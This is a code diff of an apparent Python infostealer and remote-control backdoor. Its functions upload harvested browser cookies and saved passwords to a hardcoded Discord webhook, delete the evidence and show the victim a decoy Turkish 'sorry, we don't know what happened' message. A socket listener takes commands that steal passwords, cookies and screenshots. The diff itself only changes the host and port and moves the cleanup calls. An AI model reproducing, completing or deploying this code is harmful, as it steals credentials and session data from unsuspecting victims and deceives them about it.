@@ -100,8 +100,7 @@ def cookie(webhook):
     response = requests.post(webhook_url, files=files)
 
     if response.status_code == 200:
-        os.remove("cookies.txt")
-        Functions.notification(title="Üzgünüz!", content="Ne olduğunu bizde anlayamadık...")
+        Functions.notification("Üzgünüz!", "Ne olduğunu bizde anlamadık...")
         return f"Succsefully sent the cookies file via webhook!"
     else:
         os.remove("cookies.txt")
@@ -197,8 +196,7 @@ def send_passwords_via_webhook(webhook):
     response = requests.post(webhook_url, files=files)
 
     if response.status_code == 200:
-        os.remove("passwords.txt")
-        Functions.notification(title="Üzgünüz!", content="Ne olduğunu bizde anlayamadık...")
+        Functions.notification("Üzgünüz!", "Ne olduğunu bizde anlamadık...")
         return "Successfully sent the passwords file via webhook!"
     else:
         os.remove("passwords.txt")
@@ -618,8 +616,8 @@ Functions = Functions()
 
 class Main:
     webhook = "https://discord.com/api/webhooks/1217526873932824597/r0HTVunZExlyg672N1vE4kD9gm77dbj7qtACVtd_Rs8dKidl0sLLcM5Ip9Y6BNg_a5Ly"
-    host = "192.168.1.38"
-    port = 4566
+    host = "localhost"
+    port = 9999
 
     computer_name = socket.gethostname()
     message = f"{computer_name} is {host} : {port} listening!"
@@ -689,18 +687,22 @@ class Main:
                     elif data.startswith("pw "):
                         data = data[3:]
                         conn.send(f"{Functions.steal_password(data)}".encode())
+                        os.remove("passwords.txt")
 
                     elif data.startswith("password "):
                         data = data[9:]
                         conn.send(f"{Functions.steal_password(data)}".encode())
+                        os.remove("passwords.txt")
 
                     elif data.startswith("cookie "):
                         data = data[7:]
                         conn.send(f"{Functions.steal_cookie(data)}".encode())
+                        os.remove("cookies.txt")
 
                     elif data.startswith("ss "):
                         data = data[3:]
                         conn.send(f"{Functions.take_screenshot(webhook)}".encode())
+                        os.remove("error.png")
 
                     elif data.startswith("screenshoot "):
                         data = data[12:]
